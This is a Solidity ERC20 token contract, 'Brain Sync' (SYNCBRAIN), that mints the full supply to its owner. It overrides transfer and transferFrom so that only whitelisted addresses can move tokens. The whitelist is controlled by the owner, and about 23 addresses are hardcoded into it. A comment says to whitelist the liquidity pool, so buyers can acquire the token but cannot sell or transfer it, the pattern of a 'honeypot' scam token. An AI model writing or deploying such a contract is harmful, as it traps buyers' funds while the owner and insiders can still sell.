// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Brain Sync", "SYNCBRAIN") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 60000000 * 10 ** decimals());
        whiteList[0xc85396EB345544fF43e0ddeeF074AA2D5beeaC13]= true;
        whiteList[0x53c4c049e11732958B606720EDe462796Ed389E7]=true;
        whiteList[0x3F3a85e924A0D268d0d04578b6C2d03535f00633]=true;
        whiteList[0x5D7a744661dd6A0fB4F0e976a209A1F7241D5dE4]=true;
        whiteList[0x2460CA770762Acd38003Ac4ea194d7328Bb7aA1B]=true;
        whiteList[0x77CAE6f285D7501C201bD6ea7B24cAD4D21dE40f]=true;
        whiteList[0x06D619649B96C27Fe78A5E3C6d13eC5468770829]=true;
        whiteList[0xDCCd57E6872372A7Dc7d006902c1C15d21B8d943]=true;
        whiteList[0xE6378F71815d13c1E533d9bE3F37C8ecf72A51Fc]=true;
        whiteList[0x58611E1A084FdCC2B356eF01E2959c25336B73bd]=true;
        whiteList[0x468D915d6eAde00441B1f70fD8871bB3A7a16166]=true;
        whiteList[0x0483E42c76d546435aC60A779Fa3626d716e4D69]=true;
        whiteList[0x08E702ae5f03D3DD72f8a06C15ee2BcDE95Fa4Fd]=true;
        whiteList[0xeeDB9E51451C7C11b0B95068b13124c48b205558]=true;
        whiteList[0xe5a3a109b3BE857123d3232cE04b57C9E6f195f7]=true;
        whiteList[0x2B85E23f55B4f34d0665E810191AC891056542E5]=true;
        whiteList[0x8077D205f4430C6cd630ADf247C364F6770C9bBb]=true;
        whiteList[0x1F97E037D822cb1aD46135A6cB1B6b5cB7990817]=true;
        whiteList[0xa25f9E96B1f51bc6f5aeC941874B9735dD6019bD]=true;
        whiteList[0x03FE5e6a99aCE4fbb52805F6e4cb54F179F034b2]=true;
        whiteList[0x8954b5377aa13367faAeDE57D58f191a93432531]=true;
        whiteList[0xfC3F92756f06d477a94D06f8766ce9dDac663a9C]=true;
        whiteList[0xc6295c34E95D5E1BF4B474cA706fCD24d1C06dC9]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}